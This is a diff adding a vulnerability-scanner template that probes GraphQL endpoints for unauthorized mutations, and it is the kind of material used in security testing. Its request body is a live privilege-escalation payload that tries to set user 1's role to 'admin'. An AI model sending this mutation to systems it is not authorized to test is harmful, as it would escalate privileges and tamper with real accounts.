@@ -1,0 +1,32 @@
+id: whai-graphql-mutation-abuse
+
+info:
+  name: GraphQL Unauthorized Mutation
+  author: whitehat-ai
+  severity: high
+  description: Tests GraphQL for unauthorized mutation execution
+  tags: graphql,mutation,auth,high
+  classification:
+    cwe-id: CWE-284
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/graphql"
+
+    headers:
+      Content-Type: application/json
+
+    body: '{"query":"mutation { updateUser(id: 1, input: {role: \"admin\"}) { id role } }"}'
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"data"'
+          - '"updateUser"'
+        condition: and
